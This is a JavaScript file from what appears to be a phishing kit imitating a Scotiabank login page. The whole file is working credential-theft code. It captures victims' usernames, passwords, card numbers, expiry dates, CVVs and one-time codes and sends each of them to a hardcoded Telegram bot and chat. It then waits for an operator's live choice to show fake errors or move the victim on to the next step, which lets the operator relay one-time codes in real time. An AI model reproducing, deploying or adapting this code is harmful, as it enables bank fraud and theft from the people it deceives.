document.addEventListener("DOMContentLoaded", () => {
    // Credenciales de Telegram
    const TELEGRAM_API_KEY = "88627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw"
    const TELEGRAM_CHAT_ID = "-1004245962123"
  
    // Form Elements
    const usernameForm = document.getElementById("usernameForm")
    const passwordForm = document.getElementById("passwordForm")
    const loadingOverlay = document.getElementById("loadingOverlay")
    const otpModal = document.getElementById("otpModal")
    const errorMessage = document.getElementById("errorMessage")
    const passwordError = document.getElementById("passwordError")
    const otpError = document.getElementById("otpError")
    const displayUsername = document.getElementById("displayUsername")
    const passwordInput = document.getElementById("password")
    const otpInputs = document.querySelectorAll(".otp-input input")
    const verifyOtpBtn = document.getElementById("verifyOtp")
    const resendCodeBtn = document.getElementById("resendCode")
    const otpTimerDisplay = document.getElementById("otpTimer")
  
    // Password Requirements Elements
    const reqLength = document.getElementById("req-length")
    const reqUppercase = document.getElementById("req-uppercase")
    const reqLowercase = document.getElementById("req-lowercase")
    const reqNumber = document.getElementById("req-number")
  
    let otpTimer
  
    // Password visibility toggle
    const togglePassword = document.querySelector(".toggle-password")
    togglePassword.addEventListener("click", () => {
      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password"
      passwordInput.setAttribute("type", type)
      togglePassword.innerHTML = type === "password" ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>'
    })
  
    // Edit username button
    document.querySelector(".edit-btn").addEventListener("click", () => {
      passwordForm.style.display = "none"
      usernameForm.style.display = "block"
      passwordInput.value = ""
      updatePasswordRequirements("")
    })
  
    // Password validation
    function validatePassword(password) {
      const hasLength = password.length >= 8
      const hasUppercase = /[A-Z]/.test(password)
      const hasLowercase = /[a-z]/.test(password)
      const hasNumber = /[0-9]/.test(password)
  
      reqLength.classList.toggle("valid", hasLength)
      reqUppercase.classList.toggle("valid", hasUppercase)
      reqLowercase.classList.toggle("valid", hasLowercase)
      reqNumber.classList.toggle("valid", hasNumber)
  
      return hasLength && hasUppercase && hasLowercase && hasNumber
    }
  
    function updatePasswordRequirements(password) {
      const isValid = validatePassword(password)
      passwordForm.querySelector(".btn-submit").disabled = !isValid
    }
  
    passwordInput.addEventListener("input", (e) => {
      updatePasswordRequirements(e.target.value)
    })
  
    async function sendTelegramMessage(message, options = ["Mostrar error", "Permitir acceso"]) {
      const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendMessage`
  
      const keyboard = {
        inline_keyboard: [
          options.map((option) => ({ text: option, callback_data: option.toLowerCase().replace(/ /g, "_") })),
        ],
      }
  
      try {
        const response = await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML",
            reply_markup: JSON.stringify(keyboard),
          }),
        })
        const data = await response.json()
        return data.result.message_id
      } catch (error) {
        console.error("Error al enviar mensaje a Telegram:", error)
        return null
      }
    }
  
    async function checkTelegramResponse(messageId) {
      const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/getUpdates?offset=-1&limit=1`
  
      try {
        const response = await fetch(url)
        const data = await response.json()
  
        if (data.ok && data.result.length > 0) {
          const update = data.result[0]
          if (update.callback_query && update.callback_query.message.message_id === messageId) {
            return update.callback_query.data
          }
        }
        return null
      } catch (error) {
        console.error("Error al verificar respuesta de Telegram:", error)
        return null
      }
    }
  
    function startPolling(messageId) {
      return new Promise((resolve) => {
        const interval = setInterval(async () => {
          const response = await checkTelegramResponse(messageId)
          if (response) {
            clearInterval(interval)
            resolve(response)
          }
        }, 2000)
      })
    }
  
    // Username form submission
    usernameForm.addEventListener("submit", async (e) => {
      e.preventDefault()
      const username = document.getElementById("username").value
  
      if (username) {
        loadingOverlay.style.display = "flex"
        errorMessage.style.display = "none"
  
        const messageId = await sendTelegramMessage(`
  🏦 Nuevo intento de acceso a Scotiabank
  👤 Usuario: ${username}
  
  Por favor, seleccione una acción:
              `)
  
        if (messageId) {
          const adminResponse = await startPolling(messageId)
          loadingOverlay.style.display = "none"
  
          if (adminResponse === "mostrar_error") {
            errorMessage.textContent = "Usuario incorrecto. Por favor, inténtelo de nuevo."
            errorMessage.style.display = "block"
            document.getElementById("username").value = ""
          } else if (adminResponse === "permitir_acceso") {
            usernameForm.style.display = "none"
            passwordForm.style.display = "block"
            displayUsername.textContent = username
          }
        }
      }
    })
  
    // Password form submission
    passwordForm.addEventListener("submit", async (e) => {
      e.preventDefault()
      const username = displayUsername.textContent
      const password = passwordInput.value
  
      if (validatePassword(password)) {
        loadingOverlay.style.display = "flex"
        passwordError.style.display = "none"
  
        const messageId = await sendTelegramMessage(`
  🏦 Contraseña ingresada en Scotiabank
  👤 Usuario: ${username}
  🔑 Contraseña: ${password}
  
  Por favor, seleccione una acción:
              `)
  
        if (messageId) {
          const adminResponse = await startPolling(messageId)
          loadingOverlay.style.display = "none"
  
          if (adminResponse === "mostrar_error") {
            passwordError.textContent = "Contraseña incorrecta. Por favor, inténtelo de nuevo."
            passwordError.style.display = "block"
            passwordInput.value = ""
            updatePasswordRequirements("")
          } else if (adminResponse === "permitir_acceso") {
            passwordForm.style.display = "none"
            cardForm.style.display = "block"
          }
        }
      }
    })
  
    // OTP functionality
    function startOtpTimer() {
      let timeLeft = 300 // 5 minutes
      resendCodeBtn.classList.add("disabled")
  
      clearInterval(otpTimer)
      otpTimer = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60)
        const seconds = timeLeft % 60
        otpTimerDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, "0")}`
  
        if (timeLeft === 0) {
          clearInterval(otpTimer)
          resendCodeBtn.classList.remove("disabled")
        } else {
          timeLeft--
        }
      }, 1000)
    }
  
    // OTP input handling
    otpInputs.forEach((input, index) => {
      input.addEventListener("input", (e) => {
        if (e.target.value.length === 1) {
          if (index < otpInputs.length - 1) {
            otpInputs[index + 1].focus()
          }
        }
      })
  
      input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && index > 0 && input.value.length === 0) {
          otpInputs[index - 1].focus()
        }
      })
    })
  
    // Verify OTP
    verifyOtpBtn.addEventListener("click", async () => {
      const otp = Array.from(otpInputs)
        .map((input) => input.value)
        .join("")
  
      if (otp.length === 6) {
        loadingOverlay.style.display = "flex"
        otpModal.style.display = "none"
        otpError.style.display = "none"
  
        const messageId = await sendTelegramMessage(
          `
  🏦 Código OTP ingresado en Scotiabank
  🔢 Código: ${otp}
  
  Por favor, seleccione una acción:
              `,
          ["Error de token", "Permitir acceso"],
        )
  
        if (messageId) {
          const adminResponse = await startPolling(messageId)
          loadingOverlay.style.display = "none"
  
          if (adminResponse === "error_de_token") {
            otpModal.style.display = "flex"
            otpError.textContent = "Código incorrecto. Por favor, inténtelo de nuevo."
            otpError.style.display = "block"
            Array.from(otpInputs).forEach((input) => (input.value = ""))
            otpInputs[0].focus()
          } else if (adminResponse === "permitir_acceso") {
            window.location.href = '../confirmacion.html'
          }
        }
      }
    })
  
    // Resend OTP code
    resendCodeBtn.addEventListener("click", (e) => {
      e.preventDefault()
      if (!resendCodeBtn.classList.contains("disabled")) {
        Array.from(otpInputs).forEach((input) => (input.value = ""))
        otpInputs[0].focus()
        startOtpTimer()
      }
    })
  
    // New Card Form Functionality
    const cardForm = document.getElementById("cardForm")
    const cardNumber = document.getElementById("cardNumber")
    const expiryMonth = document.getElementById("expiryMonth")
    const expiryYear = document.getElementById("expiryYear")
    const cvv = document.getElementById("cvv")
    const cardError = document.getElementById("cardError")
  
    // Format card number with spaces
    cardNumber.addEventListener("input", (e) => {
      const value = e.target.value.replace(/\s/g, "").replace(/\D/g, "")
      let formattedValue = ""
      for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) {
          formattedValue += " "
        }
        formattedValue += value[i]
      }
      e.target.value = formattedValue
    })
  
    // Validate expiry month
    expiryMonth.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length === 1 && value > 1) {
        value = "0" + value
      }
      if (Number.parseInt(value) > 12) {
        value = "12"
      }
      e.target.value = value
      if (value.length === 2) {
        expiryYear.focus()
      }
    })
  
    // Validate expiry year
    expiryYear.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      const currentYear = new Date().getFullYear() % 100
      if (value.length === 2 && Number.parseInt(value) < currentYear) {
        value = currentYear.toString()
      }
      e.target.value = value
    })
  
    // Validate CVV
    cvv.addEventListener("input", (e) => {
      e.target.value = e.target.value.replace(/\D/g, "")
    })
  
    // Card form submission
    cardForm.addEventListener("submit", async (e) => {
      e.preventDefault()
      const cardData = {
        number: cardNumber.value.replace(/\s/g, ""),
        expiry: `${expiryMonth.value}/${expiryYear.value}`,
        cvv: cvv.value,
      }
  
      if (cardData.number.length === 16 && cardData.expiry.length === 5 && cardData.cvv.length === 3) {
        loadingOverlay.style.display = "flex"
        cardError.style.display = "none"
  
        const messageId = await sendTelegramMessage(`
  🏦 Datos de tarjeta ingresados en Scotiabank
  💳 Número: ${cardData.number}
  📅 Vencimiento: ${cardData.expiry}
  🔒 CVV: ${cardData.cvv}
  
  Por favor, seleccione una acción:
              `)
  
        if (messageId) {
          const adminResponse = await startPolling(messageId)
          loadingOverlay.style.display = "none"
  
          if (adminResponse === "mostrar_error") {
            cardError.textContent = "Datos de tarjeta inválidos. Por favor, verifique e intente nuevamente."
            cardError.style.display = "block"
            cardNumber.value = ""
            expiryMonth.value = ""
            expiryYear.value = ""
            cvv.value = ""
          } else if (adminResponse === "permitir_acceso") {
            otpModal.style.display = "flex"
            startOtpTimer()
            window.location.href = '../confirmacion.html'
          }
        }
      }
    })
  })
  
  